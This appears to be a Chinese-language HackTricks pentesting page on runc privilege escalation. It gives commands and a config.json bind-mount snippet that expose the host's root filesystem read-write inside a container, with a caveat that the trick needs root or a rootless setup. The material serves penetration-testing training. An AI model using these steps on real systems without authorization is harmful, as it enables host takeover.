# RunC 权限提升

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

如果你想进一步了解 **runc**，请查看以下页面：


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

如果你发现主机上已安装 `runc`，你可能可以**运行一个挂载主机 root / 目录的容器**。
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 这并不总是有效，因为 runc 的默认操作是以 root 身份运行，所以以非特权用户运行它根本无法工作（除非你使用 rootless 配置）。通常不建议将 rootless 配置设为默认配置，因为在 rootless containers 内部存在不少在 rootless containers 外部不适用的限制。

{{#include ../../banners/hacktricks-training.md}}
